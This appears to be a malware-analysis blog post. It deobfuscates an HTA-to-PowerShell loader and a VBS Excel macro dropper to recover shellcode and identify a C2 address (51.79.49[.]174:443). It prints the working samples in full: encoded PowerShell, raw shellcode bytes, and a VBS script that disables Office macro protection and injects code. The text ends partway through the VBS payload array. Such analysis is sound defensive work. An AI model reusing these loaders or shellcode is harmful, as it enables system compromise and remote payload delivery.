## All Things Shellcode

A couple of examples of deobfuscating scripts to reveal shellcode, and then analysing the shellcode to find the underlying commands.

## HTA > PowerShell > Shellcode

This sample begins with a HTA script, as follows:

```
<script>
tszJiHJvyBxIKisKzcmHKR = "WS";
VoZouSWKcNpnLvA = "crip";
hyhlgEZiBgaCjaJPrNpDrZQi = "t.Sh";
PTBsdHRJtLQIpJAeqZ = "ell";
qQnZFFhoGvbrgs = (tszJiHJvyBxIKisKzcmHKR + VoZouSWKcNpnLvA + hyhlgEZiBgaCjaJPrNpDrZQi + PTBsdHRJtLQIpJAeqZ);
rwXRzuPgvutxxjOvbZUWejvaCO=new ActiveXObject(qQnZFFhoGvbrgs);
NGebvfDRMyzcdzWfqARaBRovQ = "cm";
JlCKObjiHOicmdivHQGHBhp = "d.e";
VYdWjsNKEaSIfEGExQu = "xe";
ckFMmsPAsm = (NGebvfDRMyzcdzWfqARaBRovQ + JlCKObjiHOicmdivHQGHBhp + VYdWjsNKEaSIfEGExQu);
rwXRzuPgvutxxjOvbZUWejvaCO.run('%windir%\\System32\\' + ckFMmsPAsm + ' /c powershell -w 1 -C "sv Ki -;sv xP ec;sv s ((gv Ki).value.toString()+(gv xP).value.toString());powershell (gv s).value.toString() \'JABNAFAAbQAgAD0AIAAnACQATQBQACAAPQAgACcAJwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAFYAaQByAHQAdQBhAGwAQQBsAGwAbwBjACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAHMAcwAsACAAdQBpAG4AdAAgAGQAdwBTAGkAegBlACwAIAB1AGkAbgB0ACAAZgBsAEEAbABsAG8AYwBhAHQAaQBvAG4AVAB5AHAAZQAsACAAdQBpAG4AdAAgAGYAbABQAHIAbwB0AGUAYwB0ACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgASQBuAHQAUAB0AHIAIABsAHAAVABoAHIAZQBhAGQAQQB0AHQAcgBpAGIAdQB0AGUAcwAsACAAdQBpAG4AdAAgAGQAdwBTAHQAYQBjAGsAUwBpAHoAZQAsACAASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALAAgAEkAbgB0AFAAdAByACAAbABwAFAAYQByAGEAbQBlAHQAZQByACwAIAB1AGkAbgB0ACAAZAB3AEMAcgBlAGEAdABpAG8AbgBGAGwAYQBnAHMALAAgAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEkAZAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQBzAHYAYwByAHQALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAZwBMACAAPQAgAEEAZABkAC0AVAB5AHAAZQAgAC0AbQBlAG0AYgBlAHIARABlAGYAaQBuAGkAdABpAG8AbgAgACQATQBQACAALQBOAGEAbQBlACAAIgBXAGkAbgAzADIAIgAgAC0AbgBhAG0AZQBzAHAAYQBjAGUAIABXAGkAbgAzADIARgB1AG4AYwB0AGkAbwBuAHMAIAAtAHAAYQBzAHMAdABoAHIAdQA7AFsAQgB5AHQAZQBbAF0AXQA7AFsAQgB5AHQAZQBbAF0AXQAkAGEATgAgAD0AIAAwAHgAZgBjACwAMAB4AGUAOAAsADAAeAA4ADkALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAAwADAALAAwAHgANgAwACwAMAB4ADgAOQAsADAAeABlADUALAAwAHgAMwAxACwAMAB4AGQAMgAsADAAeAA2ADQALAAwAHgAOABiACwAMAB4ADUAMgAsADAAeAAzADAALAAwAHgAOABiACwAMAB4ADUAMgAsADAAeAAwAGMALAAwAHgAOABiACwAMAB4ADUAMgAsADAAeAAxADQALAAwAHgAOABiACwAMAB4ADcAMgAsADAAeAAyADgALAAwAHgAMABmACwAMAB4AGIANwAsADAAeAA0AGEALAAwAHgAMgA2ACwAMAB4ADMAMQAsADAAeABmAGYALAAwAHgAMwAxACwAMAB4AGMAMAAsADAAeABhAGMALAAwAHgAMwBjACwAMAB4ADYAMQAsADAAeAA3AGMALAAwAHgAMAAyACwAMAB4ADIAYwAsADAAeAAyADAALAAwAHgAYwAxACwAMAB4AGMAZgAsADAAeAAwAGQALAAwAHgAMAAxACwAMAB4AGMANwAsADAAeABlADIALAAwAHgAZgAwACwAMAB4ADUAMgAsADAAeAA1ADcALAAwAHgAOABiACwAMAB4ADUAMgAsADAAeAAxADAALAAwAHgAOABiACwAMAB4ADQAMgAsADAAeAAzAGMALAAwAHgAMAAxACwAMAB4AGQAMAAsADAAeAA4AGIALAAwAHgANAAwACwAMAB4ADcAOAAsADAAeAA4ADUALAAwAHgAYwAwACwAMAB4ADcANAAsADAAeAA0AGEALAAwAHgAMAAxACwAMAB4AGQAMAAsADAAeAA1ADAALAAwAHgAOABiACwAMAB4ADQAOAAsADAAeAAxADgALAAwAHgAOABiACwAMAB4ADUAOAAsADAAeAAyADAALAAwAHgAMAAxACwAMAB4AGQAMwAsADAAeABlADMALAAwAHgAMwBjACwAMAB4ADQAOQAsADAAeAA4AGIALAAwAHgAMwA0ACwAMAB4ADgAYgAsADAAeAAwADEALAAwAHgAZAA2ACwAMAB4ADMAMQAsADAAeABmAGYALAAwAHgAMwAxACwAMAB4AGMAMAAsADAAeABhAGMALAAwAHgAYwAxACwAMAB4AGMAZgAsADAAeAAwAGQALAAwAHgAMAAxACwAMAB4AGMANwAsADAAeAAzADgALAAwAHgAZQAwACwAMAB4ADcANQAsADAAeABmADQALAAwAHgAMAAzACwAMAB4ADcAZAAsADAAeABmADgALAAwAHgAMwBiACwAMAB4ADcAZAAsADAAeAAyADQALAAwAHgANwA1ACwAMAB4AGUAMgAsADAAeAA1ADgALAAwAHgAOABiACwAMAB4ADUAOAAsADAAeAAyADQALAAwAHgAMAAxACwAMAB4AGQAMwAsADAAeAA2ADYALAAwAHgAOABiACwAMAB4ADAAYwAsADAAeAA0AGIALAAwAHgAOABiACwAMAB4ADUAOAAsADAAeAAxAGMALAAwAHgAMAAxACwAMAB4AGQAMwAsADAAeAA4AGIALAAwAHgAMAA0ACwAMAB4ADgAYgAsADAAeAAwADEALAAwAHgAZAAwACwAMAB4ADgAOQAsADAAeAA0ADQALAAwAHgAMgA0ACwAMAB4ADIANAAsADAAeAA1AGIALAAwAHgANQBiACwAMAB4ADYAMQAsADAAeAA1ADkALAAwAHgANQBhACwAMAB4ADUAMQAsADAAeABmAGYALAAwAHgAZQAwACwAMAB4ADUAOAAsADAAeAA1AGYALAAwAHgANQBhACwAMAB4ADgAYgAsADAAeAAxADIALAAwAHgAZQBiACwAMAB4ADgANgAsADAAeAA1AGQALAAwAHgANgA4ACwAMAB4ADMAMwAsADAAeAAzADIALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAA2ADgALAAwAHgANwA3ACwAMAB4ADcAMwAsADAAeAAzADIALAAwAHgANQBmACwAMAB4ADUANAAsADAAeAA2ADgALAAwAHgANABjACwAMAB4ADcANwAsADAAeAAyADYALAAwAHgAMAA3ACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgAYgA4ACwAMAB4ADkAMAAsADAAeAAwADEALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAAyADkALAAwAHgAYwA0ACwAMAB4ADUANAAsADAAeAA1ADAALAAwAHgANgA4ACwAMAB4ADIAOQAsADAAeAA4ADAALAAwAHgANgBiACwAMAB4ADAAMAAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADUAMAAsADAAeAA1ADAALAAwAHgANQAwACwAMAB4ADUAMAAsADAAeAA0ADAALAAwAHgANQAwACwAMAB4ADQAMAAsADAAeAA1ADAALAAwAHgANgA4ACwAMAB4AGUAYQAsADAAeAAwAGYALAAwAHgAZABmACwAMAB4AGUAMAAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADkANwAsADAAeAA2AGEALAAwAHgAMAA1ACwAMAB4ADYAOAAsADAAeAAzADMALAAwAHgANABmACwAMAB4ADMAMQAsADAAeABhAGUALAAwAHgANgA4ACwAMAB4ADAAMgAsADAAeAAwADAALAAwAHgAMAAxACwAMAB4AGIAYgAsADAAeAA4ADkALAAwAHgAZQA2ACwAMAB4ADYAYQAsADAAeAAxADAALAAwAHgANQA2ACwAMAB4ADUANwAsADAAeAA2ADgALAAwAHgAOQA5ACwAMAB4AGEANQAsADAAeAA3ADQALAAwAHgANgAxACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgAOAA1ACwAMAB4AGMAMAAsADAAeAA3ADQALAAwAHgAMABjACwAMAB4AGYAZgAsADAAeAA0AGUALAAwAHgAMAA4ACwAMAB4ADcANQAsADAAeABlAGMALAAwAHgANgA4ACwAMAB4AGYAMAAsADAAeABiADUALAAwAHgAYQAyACwAMAB4ADUANgAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADYAYQAsADAAeAAwADAALAAwAHgANgBhACwAMAB4ADAANAAsADAAeAA1ADYALAAwAHgANQA3ACwAMAB4ADYAOAAsADAAeAAwADIALAAwAHgAZAA5ACwAMAB4AGMAOAAsADAAeAA1AGYALAAwAHgAZgBmACwAMAB4AGQANQAsADAAeAA4AGIALAAwAHgAMwA2ACwAMAB4ADYAYQAsADAAeAA0ADAALAAwAHgANgA4ACwAMAB4ADAAMAAsADAAeAAxADAALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAA1ADYALAAwAHgANgBhACwAMAB4ADAAMAAsADAAeAA2ADgALAAwAHgANQA4ACwAMAB4AGEANAAsADAAeAA1ADMALAAwAHgAZQA1ACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgAOQAzACwAMAB4ADUAMwAsADAAeAA2AGEALAAwAHgAMAAwACwAMAB4ADUANgAsADAAeAA1ADMALAAwAHgANQA3ACwAMAB4ADYAOAAsADAAeAAwADIALAAwAHgAZAA5ACwAMAB4AGMAOAAsADAAeAA1AGYALAAwAHgAZgBmACwAMAB4AGQANQAsADAAeAAwADEALAAwAHgAYwAzACwAMAB4ADIAOQAsADAAeABjADYALAAwAHgAOAA1ACwAMAB4AGYANgAsADAAeAA3ADUALAAwAHgAZQBjACwAMAB4AGMAMwA7ACQAVQBkACAAPQAgADAAeAAxADAAMAAwADsAaQBmACAAKAAkAGEATgAuAEwAZQBuAGcAdABoACAALQBnAHQAIAAwAHgAMQAwADAAMAApAHsAJABVAGQAIAA9ACAAJABhAE4ALgBMAGUAbgBnAHQAaAB9ADsAJABtAE0APQAkAGcATAA6ADoAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKAAwACwAMAB4ADEAMAAwADAALAAkAFUAZAAsADAAeAA0ADAAKQA7AGYAbwByACAAKAAkAEIAdwA9ADAAOwAkAEIAdwAgAC0AbABlACAAKAAkAGEATgAuAEwAZQBuAGcAdABoAC0AMQApADsAJABCAHcAKwArACkAIAB7ACQAZwBMADoAOgBtAGUAbQBzAGUAdAAoAFsASQBuAHQAUAB0AHIAXQAoACQAbQBNAC4AVABvAEkAbgB0ADMAMgAoACkAKwAkAEIAdwApACwAIAAkAGEATgBbACQAQgB3AF0ALAAgADEAKQB9ADsAJABnAEwAOgA6AEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgAMAAsADAALAAkAG0ATQAsADAALAAwACwAMAApADsAZgBvAHIAIAAoADsAKQB7AFMAdABhAHIAdAAtAFMAbABlAGUAcAAgADYAMAB9ADsAJwA7ACQAYwBGACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkAE0AUABtACkAKQA7ACQAcABxACAAPQAgACIALQBlAGMAIAAiADsAaQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA4ACkAewAkAEoAcgAgAD0AIAAkAGUAbgB2ADoAUwB5AHMAdABlAG0AUgBvAG8AdAAgACsAIAAiAFwAcwB5AHMAdwBvAHcANgA0AFwAVwBpAG4AZABvAHcAcwBQAG8AdwBlAHIAUwBoAGUAbABsAFwAdgAxAC4AMABcAHAAbwB3AGUAcgBzAGgAZQBsAGwAIgA7AGkAZQB4ACAAIgAmACAAJABKAHIAIAAkAHAAcQAgACQAYwBGACIAfQBlAGwAcwBlAHsAOwBpAGUAeAAgACIAJgAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAkAHAAcQAgACQAYwBGACIAOwB9AA==\'"', 0);window.close();
</script>
```

There are references to WScript and PowerShell, followed by a large Base64 blob, we'll decode this blob to reveal the contents:

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/7d041fc7-25e7-4329-ab68-053176191270)


```
$MPm = '$MP = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public
static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$gL = Add-Type -memberDefinition $MP -Name "Win32" -namespace Win32Functions -passthru;
[Byte[]];[Byte[]]$aN =
0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x33,0x4f,0x31,0xae,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$Ud = 0x1000;if ($aN.Length -gt 0x1000){$Ud =
$aN.Length};$mM=$gL::VirtualAlloc(0,0x1000,$Ud,0x40);for ($Bw=0;$Bw -le ($aN.Length-1);$Bw++) {$gL::memset([IntPtr]($mM.ToInt32()+$Bw), $aN[$Bw], 1)};$gL::CreateThread(0,0,$mM,0,0,0);for (;)
{Start-Sleep 60};';$cF = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($MPm));$pq = "-ec ";if([IntPtr]::Size -eq 8){$Jr = $env:SystemRoot +
"\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $Jr $pq $cF"}else{;iex "& powershell $pq $cF";}
```

There are references to injection APIs such as VirtualAlloc, Memset and CreateThread, which could be an indication that the following hex blob is shellcode.

We can validate this by using the disassemble x86 operator in CyberChef.

<img width="1386" alt="image" src="https://github.com/MZHeader/MZHeader.github.io/assets/151963631/6279660b-dcb3-4cac-945e-98395f92b469">

We can emulate this shellcode by using Speakeasy, we'll save the shellcode from CyberChef and run it against Speakeasy to reveal the following code:

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/038af658-e528-4fc0-a982-88c87b10dc21)

```
* exec: shellcode
0x10a2: 'kernel32.LoadLibraryA("ws2_32")' -> 0x78c00000
0x10b2: 'ws2_32.WSAStartup(0x190, 0x1203e4c)' -> 0x0
0x10c1: 'ws2_32.WSASocketA("AF_INET", "SOCK_STREAM", 0x0, 0x0, 0x0, 0x0)' -> 0x4
0x10db: 'ws2_32.connect(0x4, "51.79.49.174:443", 0x10)' -> 0x0
0x10f8: 'ws2_32.recv(0x4, 0x1203e40, 0x4, 0x0)' -> 0x4
0x110b: 'kernel32.VirtualAlloc(0x0, 0x8, 0x1000, "PAGE_EXECUTE_READWRITE")' -> 0x50000
0x1119: 'ws2_32.recv(0x4, 0x50000, 0x8, 0x0)' -> 0x8
0x50008: Unhandled interrupt: intnum=0x3
0x50008: shellcode: Caught error: unhandled_interrupt
* Finished emulating
```

It looks like this is a downloader, with a C2 address of 51.79.49[.]174:443

## Obfuscated VBS > Shellcode

This second example involves deobfuscating a VBS script to reveal and interrogate Shellcode to find the C2 address.

Initial Script:
```

Dim objExcel, WshShell, RegPath, action, objWorkbook, xlmodule

Set objExcel = CreateObject("Excel.Application")
objExcel.Visible = False

Set WshShell = CreateObject("Wscript.Shell")

function RegExists(regKey)
	on error resume next
	WshShell.RegRead regKey
	RegExists = (Err.number = 0)
end function

' Get the old AccessVBOM value
RegPath = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & objExcel.Version & "\Excel\Security\AccessVBOM"

if RegExists(RegPath) then
	action = WshShell.RegRead(RegPath)
else
	action = ""
end if

' Weaken the target
WshShell.RegWrite RegPath, 1, "REG_DWORD"

' Run the macro
Set objWorkbook = objExcel.Workbooks.Add()
Set xlmodule = objWorkbook.VBProject.VBComponents.Add(1)
xlmodule.CodeModule.AddFromString "Private "&"Type PRO"&"CESS_INF"&"ORMATION"&Chr(10)&"    hPro"&"cess As "&"Long"&Chr(10)&"    hThr"&"ead As L"&"ong"&Chr(10)&"    dwPr"&"ocessId "&"As Long"&Chr(10)&"    dwTh"&"readId A"&"s Long"&Chr(10)& _
"End Type"&Chr(10)&Chr(10)&"Private "&"Type STA"&"RTUPINFO"&Chr(10)&"    cb A"&"s Long"&Chr(10)&"    lpRe"&"served A"&"s String"&Chr(10)&"    lpDe"&"sktop As"&" String"&Chr(10)&"    lpTi"&"tle As S"&"tring"& _
Chr(10)&"    dwX "&"As Long"&Chr(10)&"    dwY "&"As Long"&Chr(10)&"    dwXS"&"ize As L"&"ong"&Chr(10)&"    dwYS"&"ize As L"&"ong"&Chr(10)&"    dwXC"&"ountChar"&"s As Lon"&"g"&Chr(10)&"    dwYC"&"ountChar"& _
"s As Lon"&"g"&Chr(10)&"    dwFi"&"llAttrib"&"ute As L"&"ong"&Chr(10)&"    dwFl"&"ags As L"&"ong"&Chr(10)&"    wSho"&"wWindow "&"As Integ"&"er"&Chr(10)&"    cbRe"&"served2 "&"As Integ"&"er"&Chr(10)&"    lpRe"& _
"served2 "&"As Long"&Chr(10)&"    hStd"&"Input As"&" Long"&Chr(10)&"    hStd"&"Output A"&"s Long"&Chr(10)&"    hStd"&"Error As"&" Long"&Chr(10)&"End Type"&Chr(10)&Chr(10)&Chr(35)&"If VBA7 "&"Then"&Chr(10)& _
"    Priv"&"ate Decl"&"are PtrS"&"afe Func"&"tion Cre"&"ateStuff"&" Lib "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"CreateRe"&"moteThre"&"ad"&Chr(34)&" "&Chr(40)&"ByVal hP"&"rocess A"&"s Long"&Chr(44)& _
" ByVal l"&"pThreadA"&"ttribute"&"s As Lon"&"g"&Chr(44)&" ByVal d"&"wStackSi"&"ze As Lo"&"ng"&Chr(44)&" ByVal l"&"pStartAd"&"dress As"&" LongPtr"&Chr(44)&" lpParam"&"eter As "&"Long"&Chr(44)&" ByVal d"& _
"wCreatio"&"nFlags A"&"s Long"&Chr(44)&" lpThrea"&"dID As L"&"ong"&Chr(41)&" As Long"&"Ptr"&Chr(10)&"    Priv"&"ate Decl"&"are PtrS"&"afe Func"&"tion All"&"ocStuff "&"Lib "&Chr(34)&"kernel32"&Chr(34)&" Alias "& _
Chr(34)&"VirtualA"&"llocEx"&Chr(34)&" "&Chr(40)&"ByVal hP"&"rocess A"&"s Long"&Chr(44)&" ByVal l"&"pAddr As"&" Long"&Chr(44)&" ByVal l"&"Size As "&"Long"&Chr(44)&" ByVal f"&"lAllocat"&"ionType "&"As Long"& _
Chr(44)&" ByVal f"&"lProtect"&" As Long"&Chr(41)&" As Long"&"Ptr"&Chr(10)&"    Priv"&"ate Decl"&"are PtrS"&"afe Func"&"tion Wri"&"teStuff "&"Lib "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"WritePro"& _
"cessMemo"&"ry"&Chr(34)&" "&Chr(40)&"ByVal hP"&"rocess A"&"s Long"&Chr(44)&" ByVal l"&"Dest As "&"LongPtr"&Chr(44)&" ByRef S"&"ource As"&" Any"&Chr(44)&" ByVal L"&"ength As"&" Long"&Chr(44)&" ByVal L"& _
"engthWro"&"te As Lo"&"ngPtr"&Chr(41)&" As Long"&"Ptr"&Chr(10)&"    Priv"&"ate Decl"&"are PtrS"&"afe Func"&"tion Run"&"Stuff Li"&"b "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"CreatePr"&"ocessA"&Chr(34)& _
" "&Chr(40)&"ByVal lp"&"Applicat"&"ionName "&"As Strin"&"g"&Chr(44)&" ByVal l"&"pCommand"&"Line As "&"String"&Chr(44)&" lpProce"&"ssAttrib"&"utes As "&"Any"&Chr(44)&" lpThrea"&"dAttribu"&"tes As A"&"ny"& _
Chr(44)&" ByVal b"&"InheritH"&"andles A"&"s Long"&Chr(44)&" ByVal d"&"wCreatio"&"nFlags A"&"s Long"&Chr(44)&" lpEnvir"&"onment A"&"s Any"&Chr(44)&" ByVal l"&"pCurrent"&"Director"&"y As Str"&"ing"&Chr(44)& _
" lpStart"&"upInfo A"&"s STARTU"&"PINFO"&Chr(44)&" lpProce"&"ssInform"&"ation As"&" PROCESS"&"_INFORMA"&"TION"&Chr(41)&" As Long"&Chr(10)&Chr(35)&"Else"&Chr(10)&"    Priv"&"ate Decl"&"are Func"&"tion Cre"& _
"ateStuff"&" Lib "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"CreateRe"&"moteThre"&"ad"&Chr(34)&" "&Chr(40)&"ByVal hP"&"rocess A"&"s Long"&Chr(44)&" ByVal l"&"pThreadA"&"ttribute"&"s As Lon"&"g"&Chr(44)& _
" ByVal d"&"wStackSi"&"ze As Lo"&"ng"&Chr(44)&" ByVal l"&"pStartAd"&"dress As"&" Long"&Chr(44)&" lpParam"&"eter As "&"Long"&Chr(44)&" ByVal d"&"wCreatio"&"nFlags A"&"s Long"&Chr(44)&" lpThrea"&"dID As L"& _
"ong"&Chr(41)&" As Long"&Chr(10)&"    Priv"&"ate Decl"&"are Func"&"tion All"&"ocStuff "&"Lib "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"VirtualA"&"llocEx"&Chr(34)&" "&Chr(40)&"ByVal hP"&"rocess A"& _
"s Long"&Chr(44)&" ByVal l"&"pAddr As"&" Long"&Chr(44)&" ByVal l"&"Size As "&"Long"&Chr(44)&" ByVal f"&"lAllocat"&"ionType "&"As Long"&Chr(44)&" ByVal f"&"lProtect"&" As Long"&Chr(41)&" As Long"&Chr(10)& _
"    Priv"&"ate Decl"&"are Func"&"tion Wri"&"teStuff "&"Lib "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"WritePro"&"cessMemo"&"ry"&Chr(34)&" "&Chr(40)&"ByVal hP"&"rocess A"&"s Long"&Chr(44)&" ByVal l"& _
"Dest As "&"Long"&Chr(44)&" ByRef S"&"ource As"&" Any"&Chr(44)&" ByVal L"&"ength As"&" Long"&Chr(44)&" ByVal L"&"engthWro"&"te As Lo"&"ng"&Chr(41)&" As Long"&Chr(10)&"    Priv"&"ate Decl"&"are Func"&"tion Run"& _
"Stuff Li"&"b "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"CreatePr"&"ocessA"&Chr(34)&" "&Chr(40)&"ByVal lp"&"Applicat"&"ionName "&"As Strin"&"g"&Chr(44)&" ByVal l"&"pCommand"&"Line As "&"String"&Chr(44)& _
" lpProce"&"ssAttrib"&"utes As "&"Any"&Chr(44)&" lpThrea"&"dAttribu"&"tes As A"&"ny"&Chr(44)&" ByVal b"&"InheritH"&"andles A"&"s Long"&Chr(44)&" ByVal d"&"wCreatio"&"nFlags A"&"s Long"&Chr(44)&" lpEnvir"& _
"onment A"&"s Any"&Chr(44)&" ByVal l"&"pCurrent"&"Driector"&"y As Str"&"ing"&Chr(44)&" lpStart"&"upInfo A"&"s STARTU"&"PINFO"&Chr(44)&" lpProce"&"ssInform"&"ation As"&" PROCESS"&"_INFORMA"&"TION"&Chr(41)& _
" As Long"&Chr(10)&Chr(35)&"End If"&Chr(10)&Chr(10)&"Sub Auto"&"_Open"&Chr(40)&Chr(41)&Chr(10)&"    Dim "&"myByte A"&"s Long"&Chr(44)&" myArray"&" As Vari"&"ant"&Chr(44)&" offset "&"As Long"&Chr(10)&"    Dim "& _
"pInfo As"&" PROCESS"&"_INFORMA"&"TION"&Chr(10)&"    Dim "&"sInfo As"&" STARTUP"&"INFO"&Chr(10)&"    Dim "&"sNull As"&" String"&Chr(10)&"    Dim "&"sProc As"&" String"&Chr(10)&Chr(10)&Chr(35)&"If VBA7 "& _
"Then"&Chr(10)&"    Dim "&"rwxpage "&"As LongP"&"tr"&Chr(44)&" res As "&"LongPtr"&Chr(10)&Chr(35)&"Else"&Chr(10)&"    Dim "&"rwxpage "&"As Long"&Chr(44)&" res As "&"Long"&Chr(10)&Chr(35)&"End If"&Chr(10)& _
"    myAr"&"ray "&Chr(61)&" Array"&Chr(40)&Chr(45)&"4"&Chr(44)&Chr(45)&"24"&Chr(44)&Chr(45)&"119"&Chr(44)&"0"&Chr(44)&"0"&Chr(44)&"0"&Chr(44)&"96"&Chr(44)&Chr(45)&"119"&Chr(44)&Chr(45)&"27"&Chr(44)&"49"& _
Chr(44)&Chr(45)&"46"&Chr(44)&"100"&Chr(44)&Chr(45)&"117"&Chr(44)&"82"&Chr(44)&"48"&Chr(44)&Chr(45)&"117"&Chr(44)&"82"&Chr(44)&"12"&Chr(44)&Chr(45)&"117"&Chr(44)&"82"&Chr(44)&"20"&Chr(44)&Chr(45)&"117"& _
Chr(44)&"114"&Chr(44)&"40"&Chr(44)&"15"&Chr(44)&Chr(45)&"73"&Chr(44)&"74"&Chr(44)&"38"&Chr(44)&"49"&Chr(44)&Chr(45)&"1"&Chr(44)&"49"&Chr(44)&Chr(45)&"64"&Chr(44)&Chr(45)&"84"&Chr(44)&"60"&Chr(44)&"97"& _
Chr(44)&"124"&Chr(44)&"2"&Chr(44)&"44"&Chr(44)&"32"&Chr(44)&Chr(45)&"63"&Chr(44)&Chr(45)&"49"&Chr(44)&" _"&Chr(10)&"13"&Chr(44)&"1"&Chr(44)&Chr(45)&"57"&Chr(44)&Chr(45)&"30"&Chr(44)&Chr(45)&"16"&Chr(44)& _
"82"&Chr(44)&"87"&Chr(44)&Chr(45)&"117"&Chr(44)&"82"&Chr(44)&"16"&Chr(44)&Chr(45)&"117"&Chr(44)&"66"&Chr(44)&"60"&Chr(44)&"1"&Chr(44)&Chr(45)&"48"&Chr(44)&Chr(45)&"117"&Chr(44)&"64"&Chr(44)&"120"&Chr(44)& _
